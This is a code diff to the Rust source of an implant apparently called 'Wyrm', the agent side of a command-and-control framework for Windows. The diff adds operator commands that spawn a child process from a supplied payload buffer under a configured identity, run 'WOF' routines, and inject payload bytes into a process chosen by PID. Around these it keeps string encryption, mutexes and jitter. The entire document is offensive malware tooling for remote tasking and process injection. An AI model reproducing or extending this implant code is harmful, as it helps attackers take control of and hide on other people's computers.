@@ -12,8 +12,9 @@ use rand::{
 use serde::Serialize;
 use shared::{
     net::CompletedTasks,
-    pretty_print::print_failed,
-    tasks::{Command, FirstRunData, Task, WyrmResult, tasks_contains_kill_agent},
+    tasks::{
+        Command, FirstRunData, InjectInnerForPayload, Task, WyrmResult, tasks_contains_kill_agent,
+    },
 };
 use str_crypter::{decrypt_string, sc};
 use windows_sys::{
@@ -48,12 +49,14 @@ use crate::{
         registry::{reg_add, reg_del, reg_query},
         shell::run_powershell,
     },
-    spawn::Spawn,
+    spawn_inject::{Inject, InjectMethod, Spawn, SpawnMethod},
     utils::{
-        comptime::translate_build_artifacts, proxy::resolve_web_proxy,
+        comptime::translate_build_artifacts, console::print_info, proxy::resolve_web_proxy,
         strings::generate_mutex_name, svc_controls::stop_svc_and_exit, time_utils::epoch_now,
     },
+    wofs::call_static_wof_with_arg,
 };
+use crate::{utils::console::print_failed, wofs::call_static_wof_no_arg};
 
 pub struct RetriesBeforeExit {
     /// The time in seconds to sleep between failed connections on first connection
@@ -75,6 +78,7 @@ pub struct Wyrm {
     pub first_connection_retries: RetriesBeforeExit,
     #[allow(unused)]
     mutex: WyrmMutex,
+    spawn_as: String,
 }
 
 /// The C2 configuration settings for the implant; there can be any number of these
@@ -103,6 +107,7 @@ impl Wyrm {
             agent_name_by_operator,
             jitter,
             mutex,
+            spawn_as,
         ) = translate_build_artifacts();
 
         let mutex = match WyrmMutex::new(&mutex) {
@@ -139,6 +144,7 @@ impl Wyrm {
             },
             agent_name_by_operator,
             mutex,
+            spawn_as,
         }
     }
 
@@ -332,8 +338,62 @@ impl Wyrm {
                     self.push_completed_task(&task, result);
                 }
                 Command::Spawn => {
-                    let path = task.metadata.unwrap();
-                    Spawn::spawn_sibling(&path, &self.current_working_directory);
+                    let Ok(buf) = serde_json::from_str::<Vec<u8>>(task.metadata.as_ref().unwrap())
+                    else {
+                        let msg = sc!("Failed to deserialise buffer for spawn", 97).unwrap();
+                        print_failed(msg);
+                        self.push_completed_task::<String>(&task, None);
+
+                        continue;
+                    };
+
+                    Spawn::spawn_child(buf, SpawnMethod::EarlyCascade, &self.spawn_as);
+                }
+                Command::StaticWof => {
+                    let Some(metadata) = &task.metadata else {
+                        let msg = sc!("No metadata found.", 97).unwrap();
+                        print_failed(msg);
+                        self.push_completed_task::<String>(&task, None);
+
+                        continue;
+                    };
+
+                    let Ok(metadata_deser) = serde_json::from_str::<Vec<String>>(metadata) else {
+                        let msg =
+                            sc!("Could not deserialise metadata for running the WOF.", 97).unwrap();
+                        print_failed(msg);
+                        self.push_completed_task::<String>(&task, None);
+
+                        continue;
+                    };
+
+                    let result = if metadata_deser.len() == 1 {
+                        call_static_wof_no_arg(&metadata_deser[0])
+                    } else {
+                        call_static_wof_with_arg(&metadata_deser[0], &metadata_deser[1])
+                    };
+
+                    self.push_completed_task(&task, Some(result));
+                }
+                Command::Inject => {
+                    let Some(Ok(metadata)) = task.deserialise_metadata::<InjectInnerForPayload>()
+                    else {
+                        let msg = sc!("Could not parse metadata for inject.", 97).unwrap();
+                        print_failed(&msg);
+                        self.push_completed_task::<WyrmResult<String>>(
+                            &task,
+                            Some(WyrmResult::Err(msg)),
+                        );
+                        continue;
+                    };
+
+                    let result = Inject::inject_wyrm(
+                        &metadata.payload_bytes,
+                        InjectMethod::Virgin,
+                        metadata.pid,
+                    );
+
+                    self.push_completed_task(&task, Some(result));
                 }
             }
         }
@@ -661,7 +721,8 @@ impl WyrmMutex {
         {
             use std::ffi::CStr;
 
-            use shared::pretty_print::print_success;
+            use crate::utils::console::print_success;
+
             let s = match CStr::from_bytes_until_nul(&mtx_name) {
                 Ok(s) => s,
                 Err(_) => unsafe { CStr::from_ptr("Could not parse\0".as_ptr() as _) },
